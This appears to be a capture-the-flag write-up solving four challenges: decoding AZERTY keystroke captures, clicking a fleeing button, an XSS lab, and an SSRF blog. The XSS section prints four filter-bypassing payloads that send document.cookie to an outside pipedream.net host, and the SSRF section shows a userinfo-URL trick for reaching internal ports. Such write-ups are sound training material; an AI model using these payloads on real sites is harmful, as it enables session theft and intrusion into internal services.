## Description
We were able to infiltrate a WebTopia server! However, our hacking skills are not very good... We were only able to read from the keyboard input driver. Here is the data we collected, can you have a look? It seems that is has been shuffled a bit though... Also, WebTopia freaks are frenchies, and they use an AZERTY keyboard, just in case you need that information...

## Solution 
Here, they have given us a `shuffled.bin` file which we have to decipher and get the flag.

Since they've written it in `AZERTY` format, we have to map it correctly to `QWERTY`, including the mappings for `ctrl` and `altgr` key states.
Writing a Python script- 
```Python
import struct
import sys
from pathlib import Path

def read_events(binary_file: str):
    buf = Path(binary_file).read_bytes()
    nb_entries = len(buf) // 24
    events = []
    offset = 0

    for _ in range(nb_entries):
        tv_sec, tv_usec, ev_type, code, value = struct.unpack_from('<qqHHI', buf, offset)
        events.append((tv_sec, tv_usec, ev_type, code, value))
        offset += 24

    return events

def reconstruct_text(events):
    code_to_char = {
        19: ('r', 'R', None),
        20: ('t', 'T', None),
        21: ('y', 'Y', None),
        22: ('u', 'U', None),
        25: ('p', 'P', None),
        31: ('s', 'S', None),
        32: ('d', 'D', None),
        35: ('h', 'H', None),
        46: ('c', 'C', None),
        49: ('n', 'N', None),
        50: (',', '?', None),
        2: ('&', '1', None),
        3: ('é', '2', None),
        4: ('"', '3', None),
        5: ("'", '4', '{'),
        6: ('(', '5', '['),
        7: ('-', '6', None),
        8: ('è', '7', None),
        9: ('_', '8', None),
        10: ('ç', '9', None),
        11: ('à', '0', None),
        12: (')', '-', None),
        13: ('=', '+', '}'),
    }

    CODE_LEFT_SHIFT = 42
    CODE_RIGHT_SHIFT = 54
    CODE_ALTGR = 100
    CODE_LEFT_CTRL = 29
    sorted_events = sorted(events, key=lambda e: (e[0], e[1]))

    shift_active = False
    altgr_active = False
    text = ""

    for tv_sec, tv_usec, ev_type, code, value in sorted_events:
        if ev_type != 1:
            continue
        if code in (CODE_LEFT_SHIFT, CODE_RIGHT_SHIFT):
            if value == 1:
                shift_active = True
            elif value == 0:
                shift_active = False
            continue

        if code == CODE_ALTGR:
            if value == 1:
                altgr_active = True
            elif value == 0:
                altgr_active = False
            continue

        if code == CODE_LEFT_CTRL:
            if value == 1:
                break
            else:
                continue

        if value != 1:
            continue

        if code in code_to_char:
            no_shift, with_shift, with_altgr = code_to_char[code]
            if altgr_active and (with_altgr is not None):
                ch = with_altgr
            elif shift_active:
                ch = with_shift
            else:
                ch = no_shift
            text += ch

    return text

if __name__ == '__main__':
    if len(sys.argv) > 1:
        file = sys.argv[1]
    else:
        file = 'shuffled.bin'

    if not Path(file).is_file():
        print(f"Error: the file '{file}' does not exist.")
        sys.exit(1)

    events = read_events(file)
    flag = reconstruct_text(events)

    print(flag)
```

We then obtain the flag: `N0PS{c4n_y0U_R34d_Th15??}`

# Press Me If U can

## Description
-"Stop chasing me!" said the button.

-"We can't. It's our job." they answered.

Trapped in WebTopia on a page with no way out, except for the fleeing button. Can you break free?

## Solution
We've been given with a site which looks like this.
![](./img1.png)

As given in the description, we can't click the button as it goes away from our mouse pointer.
Going to the Networks tab in Dev tools and viewing script.js-
```js
const btn = document.querySelector("button");
const OFFSET = 100;

const testEdge = function (property, axis) {
if (endPoint[property] <= 0) {
    endPoint[property] = axis - OFFSET;
} else if (endPoint[property] >= axis) {
    endPoint[property] = OFFSET;
}
};

let endPoint = { x: innerWidth / 2, y: innerHeight * 2 / 3 };

addEventListener("mousemove", (e) => {
const btnRect = btn.getBoundingClientRect();

const angle = Math.atan2(e.y - endPoint.y, e.x - endPoint.x);

const distance = Math.sqrt(
    Math.pow(e.x - endPoint.x, 2) + Math.pow(e.y - endPoint.y, 2)
);

if (distance <= OFFSET) {
    endPoint = {
    x: OFFSET * -Math.cos(angle) + e.x,
    y: OFFSET * -Math.sin(angle) + e.y
    };
}
```

We can see that the button is assigned in the `button` class. Now going to the console tab and writing `document.querySelector('button').click();`
and we get the flag: `N0PS{W3l1_i7_w4S_Ju5T_F0r_Fun}`

# XSS Lab
## Description
We got an access to a training resource from WebTopia, where they practise XSS filter bypassing. Enjoy it!

## Solution
In this challenge, we have 4 levels to cross and each level we have to steal the cookies.
![](./img3.png)

Each of the payloads for each level:
```html
<script>fetch("https://eo4ai5xu7yjhnob.m.pipedream.net?c="+document.cookie)</script>

<img src="/sfmqsjfmlkqdsfjmldsqkfjmsldkfj.png" onerror="var i=new Image();i.src='https://eo4ai5xu7yjhnob.m.pipedream.net?c='+encodeURIComponent(document.cookie);">

<iframe src=jaVa&#x73;cript:top.location='//eo4ai5xu7yjhnob.m.pipedream.net/?c='+document.cookie>

<iframe src=jaVa&#x73;cript:top.location=&#x27;&#x2f;&#x2f;eo4ai5xu7yjhnob.m.pipedream.net&#x2f;&#x3f;c&#x3d;&#x27;&#x2b;docu&#109;ent.co&#111;kie>
```
for each of the filters:
```python
def filter_2(payload):
    regex = ".*(script|(</.*>)).*"
    if re.match(regex, payload):
return "Nope"
    return payload

def filter_3(payload):
    regex = ".*(://|script|(</.*>)|(on\w+\s*=)).*"
    if re.match(regex, payload):
return "Nope"
    return payload

def filter_4(payload):
    regex = "(?i:(.*(/|script|(</.*>)|document|cookie|eval|string|(\"|'|`).*(('.+')|(\".+\")|(`.+`)).*(\"|'|`)).*))|(on\w+\s*=)|\+|!"
    if re.match(regex, payload):
return "Nope"
    return payload
```

give the endpoints for next levels:
```
xss2=/0d566d04bbc014c2d1d0902ad50a4122	
xss3=/5d1aaeadf1b52b4f2ab7042f3319a267
xss4=/b355082fc794c4d1d2b6c02e04163090
```
and passing the last level we get: `flag=N0PS{n0w_Y0u_4r3_x55_Pr0}`

# Blog 
## Description
It seems that WebTopia deployed a blog for all its inhabitants. Can you investigate on it ?

## Solution
I landed on this simple-looking blog site — nothing too fancy, just three posts with titles like:
```
How to deal with cuckroaches?
My guide to cook chick
A Desolate Cry for Help
```
And in the `/blog.php` endpoint you can filter by writing `/blog.php?blog=all`
```
[
  {"id":"1","title":"How to deal with cuckroages ?","name":"oggy"},
  {"id":"2","title":"My guide to cook chick","name":"sylvester"},
  {"id":"3","title":"A Desolate Cry for Help","name":"tom_the_cat"}
]
```
Now we try to break the id parameter by writing ```/blog.php?blog='"`{ ;$Foo}```
and PHP gives an error saying: Fatal error: curl_setopt(): cURL option must not contain any null bytes

Wait, curl? This thing is making server-side HTTP requests to:
```curl_setopt($ch, CURLOPT_URL, 'backend/' . $blog);```
This seems like a SSRF challenge

Trying a NoSQL-style input: `/blog.php?blog[$ne]=null` results in:
```str_starts_with(): Argument #1 ($haystack) must be of type string, array given```

So it might be doing
```if (str_starts_with($blog, "http://"))```
Which means if the blog param starts with http://, it treats it as a full URL and passes it to curl.

But there are filters in it, as while trying `/blog.php?blog=http://localhost/` we got hit with:

Warning: Request should only be sent to backend host.
Okay, so the site is filtering SSRF targets. Probably something like:
```
if (!str_contains($url, 'backend')) {
  die("Warning: Request should only be sent to backend host.");
}
```
Tried:

/blog.php?blog=http://backend@127.0.0.1/
 No warning!  SSRF request went through and got redirected to the index page.


This works as it is an old SSRF trick using Basic Auth syntax in URLs: `http://[username]@[host]/path`
So `http://backend@127.0.0.1:8080/` is interpreted by the browser or curl (and PHP under the hood) as:
```
backend = username
127.0.0.1:8080 = actual host
```
The username is ignored by the server if there’s no password challenge.
Now trying all the possible ports:
```
/blog.php?blog=http://backend@127.0.0.1:5000/
/blog.php?blog=http://backend@127.0.0.1:8000/
/blog.php?blog=http://backend@127.0.0.1:1337/
```
We finally get the correct port: `/blog.php?blog=http://backend@127.0.0.1:8080/` and we get the flag: `N0PS{S5rF_1s_Th3_n3W_W4y}`
